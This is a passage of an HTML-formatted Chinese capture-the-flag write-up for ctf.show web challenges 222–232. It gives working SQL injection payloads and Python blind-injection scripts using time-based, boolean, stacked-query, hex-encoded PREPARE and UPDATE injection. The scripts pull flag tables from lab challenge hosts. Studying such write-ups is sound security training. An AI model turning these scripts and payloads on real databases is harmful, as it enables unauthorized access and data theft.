class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/1</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://9a446c1a-4acd-4873-a290-53b36046a7b9.challenge.ctf.show:8080/api/"</span></span><br><span class="line">str = <span class="string">"01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#-------------------------------------------------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">#查表</span></span><br><span class="line"><span class="comment"># sql= "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span></span><br><span class="line"><span class="comment">#查字段</span></span><br><span class="line"><span class="comment"># sql= "select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_flaga'"</span></span><br><span class="line"><span class="comment">#查flag</span></span><br><span class="line">sql= <span class="string">"select flagaabc from ctfshow_flaga"</span></span><br><span class="line"><span class="comment">#-------------------------------------------------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line">payload = <span class="string">"concat(if(substr((&#123;&#125;),&#123;&#125;,1)='&#123;&#125;',sleep(0.10),0),1)"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#concat(if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)='c',sleep(0.10),0),1)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">'u'</span> : payload.format(sql,i,j)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        start = time.time()</span><br><span class="line">        res = requests.get(url = url, params = params)</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="keyword">if</span> end - start &gt; <span class="number">2</span> <span class="keyword">and</span> end - start &lt; <span class="number">3</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(n))</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">"&#125;"</span>:</span><br><span class="line">                print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210801082210482.png" alt="image-20210801082210482"></p>
<h2 id="web223"><a href="#web223" class="headerlink" title="web223"></a>web223</h2><blockquote>
<ul>
<li><strong>这题多了个过滤，将数字全部过滤了，我们可以考虑用true来代替数字，所以这题我发现有两种方式一种是时间盲注（但是延时是20秒），另一种是布尔盲注，这把我们就用布尔速度快。看你喜好。</strong></li>
</ul>
</blockquote>
<p><strong>说一下原理，为什么使用布尔盲注，当if返回这true的时候，执行username就会group by username，数据就会多一些，但是当false就会当做字符串，数据就少一些，上两张图看看</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210801103638060.png" alt="image-20210801103638060"></p>
</blockquote>
<p><strong>当if条件为false时，数据回显就少了，根据这个可以布尔盲注</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210801103725888.png" alt="image-20210801103725888"></p>
</blockquote>
<p>上脚本布尔，跑的快些，比时间盲注</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/1</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#import time</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generateNum</span><span class="params">(num)</span>:</span></span><br><span class="line">    res = <span class="string">'true'</span></span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(num<span class="number">-1</span>):</span><br><span class="line">            res += <span class="string">"+true"</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://ce009cf2-8652-4737-ba07-b3bfc3bc3a4a.challenge.ctf.show:8080/api/"</span></span><br><span class="line">str = <span class="string">"01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line"><span class="comment">#--------查表</span></span><br><span class="line"><span class="comment">#sql= "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span></span><br><span class="line"><span class="comment">#--------查字段</span></span><br><span class="line"><span class="comment">#sql= "select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_flagas'"</span></span><br><span class="line"><span class="comment">#--------查flag</span></span><br><span class="line">sql= <span class="string">"select flagasabc from ctfshow_flagas"</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line">payload = <span class="string">"if(ascii(substr((&#123;&#125;),&#123;&#125;,true))=(&#123;&#125;),username,false)"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#计数</span></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">126</span>):</span><br><span class="line">        result_num=generateNum(i)</span><br><span class="line">        result=generateNum(j)</span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">'u'</span> : payload.format(sql,result_num,result)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res = requests.get(url = url, params = params)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"userAUTO"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(n))</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">"&#125;"</span>:</span><br><span class="line">                print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment">#ctfshow&#123;728dd1b0-7547-401d-b358-2d2207f3d13c&#125;</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210801104156781.png" alt="image-20210801104156781"></p>
<h2 id="web224"><a href="#web224" class="headerlink" title="web224"></a>web224</h2><blockquote>
<ul>
<li>我以为是输入框注入，没想到是文件注入，有一个君子协议里面可以重置密码robots.txt</li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210801115756350.png" alt="image-20210801115756350"></p>
<p>登陆之后发现是一个上传点，什么都上传不进去，群里有一个payload.bin，上传就自动生成1.php，就直接是rce了，拿flag</p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210801122038785.png" alt="image-20210801122038785"></p>
<h2 id="web225"><a href="#web225" class="headerlink" title="web225"></a>web225</h2><p>第一种做法，handle，因为堆叠注入，除了过滤的语句，基本是任意执行</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 打开一个表名为 tbl_name 的表的句柄</span></span><br><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">OPEN</span> [ [<span class="keyword">AS</span>] <span class="keyword">alias</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1、通过指定索引查看表，可以指定从索引那一行开始，通过 NEXT 继续浏览</span></span><br><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">READ</span> index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [<span class="keyword">LIMIT</span> ... ]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2、通过索引查看表</span></span><br><span class="line"><span class="comment"># FIRST: 获取第一行（索引最小的一行）</span></span><br><span class="line"><span class="comment"># NEXT: 获取下一行</span></span><br><span class="line"><span class="comment"># PREV: 获取上一行</span></span><br><span class="line"><span class="comment"># LAST: 获取最后一行（索引最大的一行）</span></span><br><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">READ</span> index_name &#123; <span class="keyword">FIRST</span> | <span class="keyword">NEXT</span> | PREV | <span class="keyword">LAST</span> &#125;</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [<span class="keyword">LIMIT</span> ... ]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3、不通过索引查看表</span></span><br><span class="line"><span class="comment"># READ FIRST: 获取句柄的第一行</span></span><br><span class="line"><span class="comment"># READ NEXT: 依次获取其他行（当然也可以在获取句柄后直接使用获取第一行）</span></span><br><span class="line"><span class="comment"># 最后一行执行之后再执行 READ NEXT 会返回一个空的结果</span></span><br><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">READ</span> &#123; <span class="keyword">FIRST</span> | <span class="keyword">NEXT</span> &#125;</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [<span class="keyword">LIMIT</span> ... ]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭已打开的句柄</span></span><br><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">CLOSE</span></span><br></pre></td></tr></table></figure></div>

<p><strong>payload</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://76114b3b-7ffd-4016-8b00-b96feb693fd8.challenge.ctf.show:<span class="number">8080</span>/api/?username=ctfshow<span class="string">';handler ctfshow_flagasa open;handler ctfshow_flagasa read first--+</span></span><br></pre></td></tr></table></figure></div>

<p><strong>第二种做法预处理</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> @tn = <span class="string">'hahaha'</span>;  //存储表名</span><br><span class="line"><span class="keyword">SET</span> @<span class="keyword">sql</span> = <span class="keyword">concat</span>(<span class="string">'select * from '</span>, @tn);  //存储SQL语句</span><br><span class="line"><span class="keyword">PREPARE</span> <span class="keyword">name</span> <span class="keyword">from</span> @<span class="keyword">sql</span>;   //预定义SQL语句</span><br><span class="line"><span class="keyword">EXECUTE</span> <span class="keyword">name</span>;  //执行预定义SQL语句</span><br><span class="line">(<span class="keyword">DEALLOCATE</span> || <span class="keyword">DROP</span>) <span class="keyword">PREPARE</span> sqla;  //删除预定义SQL语句</span><br></pre></td></tr></table></figure></div>

<p>因为concat连接之后直接就是字符串，所以就直接构造payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://76114b3b-7ffd-4016-8b00-b96feb693fd8.challenge.ctf.show:<span class="number">8080</span>/api/?username=ctfshow<span class="string">';show tables;prepare gylq from concat('</span>s<span class="string">','</span>elect<span class="string">','</span> * <span class="keyword">from</span> ctfshow_flagasa<span class="string">');execute gylq;--+</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web226"><a href="#web226" class="headerlink" title="web226"></a>web226</h2><blockquote>
<ul>
<li>预处理from后面可以跟十六进制，所以可以有更骚的姿势，直接将<code>select * from ctfsh_ow_flagas</code>转换成<code>0x73656C656374202A2066726F6D2063746673685F6F775F666C61676173</code>就可以直接语句执行</li>
</ul>
</blockquote>
<p>payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://bbec116e-8f61-487c-8966-9384be4efe14.challenge.ctf.show:<span class="number">8080</span>/api/?username=userAUTO<span class="string">';prepare gylq from 0x73656C656374202A2066726F6D2063746673685F6F775F666C61676173;execute gylq--+</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web227"><a href="#web227" class="headerlink" title="web227"></a>web227</h2><blockquote>
<ul>
<li>搜了个遍，没找到flag，最后发现information_schema.routines这个表是存放函数和存储过程字段的。我们查看一下这个表，关于函数的存储过程，看看网上这篇文章<a href="https://blog.csdn.net/qq_41573234/article/details/80411079" target="_blank" rel="noopener">MySQL——查看存储过程和函数</a></li>
</ul>
</blockquote>
<p><strong>payload，查看routines的所有字段和数据</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://faa7806b-aae1-4405-8c64-1600655bcd26.challenge.ctf.show:<span class="number">8080</span>/api/?username=user1<span class="string">';prepare gylq from 0x73656C656374202A2066726F6D20696E666F726D6174696F6E5F736368656D612E726F7574696E6573;execute gylq;</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210801141034167.png" alt="image-20210801141034167"></p>
<p>可以直接用<code>1&#39;;call getflag();</code>来调用这个函数，不过这个所有字段里已经可以找到flag</p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210801141215295.png" alt="image-20210801141215295"></p>
<h2 id="web228"><a href="#web228" class="headerlink" title="web228"></a>web228</h2><blockquote>
<ul>
<li>和web226一样的做法，转十六进制</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://abd0d622-b6b8-48c7-98f3-9a49f3996b1b.challenge.ctf.show:<span class="number">8080</span>/api/?username=user1<span class="string">';prepare gylq from 0x73656C656374202A2066726F6D2063746673685F6F775F666C616761736161;execute gylq;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web229"><a href="#web229" class="headerlink" title="web229"></a>web229</h2><blockquote>
<ul>
<li>和上题一样,估计没招了</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://74ea40ed-fc20-471c-8d2e-05cbd44aadad.challenge.ctf.show:<span class="number">8080</span>/api/?username=user1<span class="string">';prepare gylq from 0x73656C656374202A2066726F6D20666C6167;execute gylq;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web230"><a href="#web230" class="headerlink" title="web230"></a>web230</h2><blockquote>
<ul>
<li>堆叠注入的精髓就是预处理和转十六进制么，和上题一样</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://bde7f4f9-1def-42cf-afee-da3025b6550a.challenge.ctf.show:<span class="number">8080</span>/api/?username=user1<span class="string">';prepare gylq from 0x73656C656374202A2066726F6D20666C61676161626278;execute gylq;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web231"><a href="#web231" class="headerlink" title="web231"></a>web231</h2><blockquote>
<ul>
<li>我看到第一眼，就想着写个脚本，看了别人wp发现不用写布尔脚本，但是我写了，所以就用脚本梭哈</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/1</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#import time</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># def generateNum(num):</span></span><br><span class="line"><span class="comment">#     res = 'true'</span></span><br><span class="line"><span class="comment">#     if num == 1:</span></span><br><span class="line"><span class="comment">#         return res</span></span><br><span class="line"><span class="comment">#     else:</span></span><br><span class="line"><span class="comment">#         for i in range(num-1):</span></span><br><span class="line"><span class="comment">#             res += "+true"</span></span><br><span class="line"><span class="comment">#         return res</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://06b28180-71ea-4f89-a05a-7d6baaf18696.challenge.ctf.show:8080/api/"</span></span><br><span class="line">str = <span class="string">"01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#password=1234567811&amp;username=ctfshow' and if(substr(database(),1,1)='c',1,0)#</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line"><span class="comment">#--------查表</span></span><br><span class="line"><span class="comment">#sql= "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span></span><br><span class="line"><span class="comment">#--------查字段</span></span><br><span class="line"><span class="comment">#sql= "select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flaga'"</span></span><br><span class="line"><span class="comment">#--------查flag</span></span><br><span class="line">sql= <span class="string">"select group_concat(flagas) from flaga"</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line">payload = <span class="string">"ctfshow' and if(substr((&#123;&#125;),&#123;&#125;,1)='&#123;&#125;',1,0)#"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#计数</span></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">'username'</span> : payload.format(sql,i,j),</span><br><span class="line">            <span class="string">'password'</span> : <span class="string">"&#123;&#125;"</span>.format(i)</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url = url, data = params)</span><br><span class="line">        <span class="comment">#print(res.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">r"\u66f4\u65b0\u6210\u529f"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(n))</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">"&#125;"</span>:</span><br><span class="line">                print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li>第二种方式，了解一下性质，学习学习。</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = "<span class="keyword">update</span> ctfshow_user <span class="keyword">set</span> pass = <span class="string">'&#123;$password&#125;'</span> <span class="keyword">where</span> username = <span class="string">'&#123;$username&#125;'</span>;";</span><br></pre></td></tr></table></figure></div>

<p>他语句是这样，那我们拼接一下成</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update ctfshow_user set pass &#x3D; &#39;1&#39;,username&#x3D;database()# where username &#x3D; &#39;&#123;$username&#125;&#39;; #后面就的被注释掉了</span><br></pre></td></tr></table></figure></div>

<p><strong>就有这样的效果</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210801150934264.png" alt="image-20210801150934264"></p>
<p><strong>这样不就任意语句执行了。</strong></p>
<p><strong>payload</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=ctfshow&amp;password=1' ,username=database()<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p><strong>拿flag</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=ctfshow&amp;password=1' ,username=(<span class="keyword">select</span> <span class="keyword">group_concat</span>(flagas) <span class="keyword">from</span> flaga)<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210801151123611.png" alt="image-20210801151123611"></p>
<h2 id="web232"><a href="#web232" class="headerlink" title="web232"></a>web232</h2><blockquote>
<ul>
<li>上把盲注脚本直接梭哈，只不过加了个给密码md5加密而已，并没有改变之前代码的性质，我代码跟用户名有关，所以不变</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/1</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#import time</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># def generateNum(num):</span></span><br><span class="line"><span class="comment">#     res = 'true'</span></span><br><span class="line"><span class="comment">#     if num == 1:</span></span><br><span class="line"><span class="comment">#         return res</span></span><br><span class="line"><span class="comment">#     else:</span></span><br><span class="line"><span class="comment">#         for i in range(num-1):</span></span><br><span class="line"><span class="comment">#             res += "+true"</span></span><br><span class="line"><span class="comment">#         return res</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://258da519-591d-4f61-b9af-c91ccb7af34f.challenge.ctf.show:8080/api/"</span></span><br><span class="line">str = <span class="string">"01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#password=1234567811&amp;username=ctfshow' and if(substr(database(),1,1)='c',1,0)#</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line"><span class="comment">#--------查表</span></span><br><span class="line"><span class="comment">#sql= "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span></span><br><span class="line"><span class="comment">#--------查字段</span></span><br><span class="line"><span class="comment">#sql= "select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flagaa'"</span></span><br><span class="line"><span class="comment">#--------查flag</span></span><br><span class="line">sql= <span class="string">"select group_concat(flagass) from flagaa"</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line">payload = <span class="string">"ctfshow' and if(substr((&#123;&#125;),&#123;&#125;,1)='&#123;&#125;',1,0)#"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#计数</span></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">'username'</span> : payload.format(sql,i,j),</span><br><span class="line">            <span class="string">'password'</span> : <span class="string">"&#123;&#125;"</span>.format(i)</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url = url, data = params)</span><br><span 